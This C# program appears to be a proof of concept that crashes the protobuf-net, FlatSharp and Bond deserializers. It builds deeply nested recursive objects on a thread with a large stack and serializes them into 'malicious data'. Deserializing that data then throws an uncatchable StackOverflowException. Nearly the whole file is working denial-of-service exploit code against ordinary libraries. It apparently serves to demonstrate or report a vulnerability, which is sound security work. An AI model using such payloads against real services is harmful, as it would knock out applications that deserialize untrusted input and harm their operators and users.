using Bond;
using Bond.IO.Safe;
using Bond.Protocols;
using FlatSharp;
using ProtoBuf;
using System;
using System.Buffers;
using System.Threading;

namespace StackOverflowException
{
    public static class Program
    {
        private const int StackSize = 100_000_000;
        private const int ProtobufNetIterations = 100_000;
        private const int FlatSharpIterations = 300_000;
        private const int BondIterations = 200_000;

        public static void Main(string[] args)
        {
            string library = args.Length > 0 ? args[0].ToLower() : "protobufnet";

            try
            {
                switch (library)
                {
                    case "protobufnet": ProtobufNetCrash(); break;
                    case "flatsharp": FlatSharpCrash(); break;
                    case "bond": BondCrash(); break;
                }
            }
            catch
            {
                // You can't catch StackOverflowException
            }
        }

        private static void ProtobufNetCrash()
        {
            var data = GenerateMaliciousData(ProtobufNetGenerator);
            Serializer.Deserialize<Recursive>(data.AsSpan());
        }

        private static void FlatSharpCrash()
        {
            var data = GenerateMaliciousData(FlatSharpGenerator);
            Node.Serializer.Parse<Node>(data);
        }

        private static void BondCrash()
        {
            var data = GenerateMaliciousData(BondGenerator);
            var buffer = new InputBuffer(data);
            var reader = new SimpleBinaryReader<InputBuffer>(buffer);
            Deserialize<Struct>.From(reader);
        }

        private static byte[] ProtobufNetGenerator()
        {
            Recursive item = null;

            for (int i = 0; i < ProtobufNetIterations; ++i)
            {
                item = new Recursive { Id = i.ToString(), Child = item };
            }

            var destination = new ArrayBufferWriter<byte>();
            Serializer.Serialize(destination, item);

            return destination.WrittenMemory.ToArray();
        }

        private static byte[] FlatSharpGenerator()
        {
            Node item = null;

            for (int i = 0; i < FlatSharpIterations; ++i)
            {
                item = new Node { Id = i.ToString(), Next = item };
            }

            var maxSize = Node.Serializer.GetMaxSize(item);
            var destination = new byte[maxSize];
            var size = Node.Serializer.Write(destination, item);

            return destination.AsSpan(0, size).ToArray();
        }

        private static byte[] BondGenerator()
        {
            Struct item = null;

            for (int i = 0; i < BondIterations; ++i)
            {
                item = new Struct { Value = (uint)i, Child = item };
            }

            var buffer = new OutputBuffer();
            var writer = new SimpleBinaryWriter<OutputBuffer>(buffer);
            Serialize.To(writer, item);

            return buffer.Data.ToArray();
        }

        private static byte[] GenerateMaliciousData(Func<byte[]> generator)
        {
            byte[] data = null;
            var thread = new Thread(() => data = generator(), StackSize);

            thread.Start();
            thread.Join();

            return data;
        }
    }
}
